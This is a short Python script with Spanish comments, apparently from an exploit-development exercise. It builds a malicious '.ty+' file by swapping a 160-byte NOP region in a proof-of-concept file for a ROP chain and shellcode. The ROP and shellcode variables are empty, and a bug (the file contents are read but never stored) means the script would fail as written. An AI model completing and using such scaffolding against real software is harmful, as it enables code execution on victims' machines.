a=open("POC2.ty+", "rb")
a.read()
a.close()

rop=""
shellcode=""

# En la variable a tenemos los bytes del archivo leido

# fruta debe tener el mismo largo que la zona de 90s que puse en el archivo
# para que lo halle y lo reemplace.

fruta = rop + shellcode +(160 -len(rop + shellcode)) *("A")

#reemplazamos los 160 bytes 90 por mi fruta de 160 de largo

a= a.replace(160 * "\x90", fruta)

#guardamos el archivo final con el ROP mas SHELLCODE

b=open("POCFINAL.ty+", "wb")
b.write(a)
b.close()
